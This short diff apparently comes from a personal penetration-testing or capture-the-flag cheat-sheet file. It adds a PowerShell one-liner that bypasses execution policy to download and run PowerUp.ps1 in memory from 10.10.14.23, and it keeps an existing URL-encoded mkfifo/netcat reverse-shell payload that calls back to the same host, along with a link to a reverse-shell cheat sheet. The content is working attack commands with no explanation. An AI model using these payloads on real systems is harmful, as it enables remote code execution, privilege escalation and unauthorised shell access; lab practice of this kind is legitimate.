@@ -1,3 +1,6 @@
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23:8000/PowerUp.ps1'); Invoke-AllChecks"
+
+
 netcat URL encoded rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.23+1234+>/tmp/f
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
